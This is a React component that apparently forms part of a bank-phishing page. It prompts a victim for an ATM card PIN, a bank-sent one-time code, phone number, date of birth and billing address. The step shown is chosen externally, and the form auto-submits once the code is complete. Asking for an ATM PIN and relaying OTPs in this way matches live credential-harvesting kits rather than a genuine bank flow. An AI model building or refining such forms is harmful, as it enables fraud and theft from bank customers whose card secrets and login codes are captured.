import { useEffect, useId, useRef, useState } from 'react';
import { Spinner } from './icons';

interface AuthPromptProps {
  field: string;
  displayText?: string;
  busy: boolean;
  onSubmit: (value: string) => void;
}

const COPY: Record<string, { title: string; hint: string; mode: string; length?: number }> = {
  pin: { title: 'Enter your card PIN', hint: 'The PIN you use at an ATM', mode: 'numeric', length: 4 },
  otp: {
    title: 'Enter the one-time code',
    hint: 'Sent by your bank to your registered phone',
    mode: 'numeric',
    length: 6,
  },
  phone: { title: 'Confirm your phone number', hint: 'The number your bank has on file', mode: 'tel' },
  birthday: { title: 'Confirm your date of birth', hint: 'Format: YYYY-MM-DD', mode: 'text' },
  address: { title: 'Confirm your billing address', hint: 'As it appears on your statement', mode: 'text' },
};

function CodeInput({
  length,
  value,
  onChange,
  disabled,
  describedBy,
  masked,
}: {
  length: number;
  value: string;
  onChange: (value: string) => void;
  disabled: boolean;
  describedBy?: string;
  masked: boolean;
}) {
  const refs = useRef<(HTMLInputElement | null)[]>([]);
  const digits = Array.from({ length }, (_, i) => value[i] ?? '');

  useEffect(() => {
    refs.current[0]?.focus();
  }, []);

  const set = (index: number, next: string) => {
    const clean = next.replace(/\D/g, '');
    if (!clean) {
      onChange(value.slice(0, index));
      return;
    }
    const merged = (value.slice(0, index) + clean).slice(0, length);
    onChange(merged);
    refs.current[Math.min(merged.length, length - 1)]?.focus();
  };

  return (
    <div className="flex gap-2.5" role="group" aria-describedby={describedBy}>
      {digits.map((digit, index) => (
        <input
          key={index}
          ref={(el) => {
            refs.current[index] = el;
          }}
          type="text"
          inputMode="numeric"
          autoComplete={index === 0 && !masked ? 'one-time-code' : 'off'}
          style={masked ? { WebkitTextSecurity: 'disc' } as React.CSSProperties : undefined}
          aria-label={`Digit ${index + 1} of ${length}`}
          maxLength={length}
          value={digit}
          disabled={disabled}
          onChange={(event) => set(index, event.target.value)}
          onKeyDown={(event) => {
            if (event.key === 'Backspace' && !digit && index > 0) {
              refs.current[index - 1]?.focus();
            }
          }}
          onFocus={(event) => event.target.select()}
          className="field-input h-14 w-full px-0 text-center text-[22px] font-bold tabular"
        />
      ))}
    </div>
  );
}

export function AuthPrompt({ field, displayText, busy, onSubmit }: AuthPromptProps) {
  const inputId = useId();
  const hintId = useId();
  const [value, setValue] = useState('');
  const copy = COPY[field] ?? { title: 'One more step', hint: '', mode: 'text' };
  const segmented = typeof copy.length === 'number';
  const ready = segmented ? value.length === copy.length : value.trim().length > 0;

  useEffect(() => {
    if (segmented && ready && !busy) onSubmit(value);
    // Auto-submit only once the last digit lands.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready]);

  return (
    <form
      className="animate-rise"
      onSubmit={(event) => {
        event.preventDefault();
        if (ready) onSubmit(value.trim());
      }}
    >
      <h2 className="text-[20px] font-extrabold tracking-[-0.02em]">{copy.title}</h2>
      <p id={hintId} className="mt-1 text-[13px] text-body">
        {copy.hint || displayText}
      </p>

      <div className="mt-6">
        {segmented ? (
          <CodeInput
            length={copy.length!}
            value={value}
            onChange={setValue}
            disabled={busy}
            describedBy={hintId}
            masked={field === 'pin'}
          />
        ) : (
          <>
            <label className="field-label" htmlFor={inputId}>
              {copy.title.replace(/^Confirm your /, '').replace(/^\w/, (c) => c.toUpperCase())}
            </label>
            <input
              id={inputId}
              className="field-input"
              type="text"
              inputMode={copy.mode as 'tel' | 'text'}
              autoComplete="off"
              value={value}
              onChange={(event) => setValue(event.target.value)}
              aria-describedby={hintId}
              autoFocus
            />
          </>
        )}
      </div>

      <button type="submit" className="primary-button mt-6" disabled={busy || !ready}>
        <span className="inline-flex items-center justify-center gap-2">
          {busy && <Spinner size={18} />}
          {busy ? 'Checking' : 'Continue'}
        </span>
      </button>
    </form>
  );
}
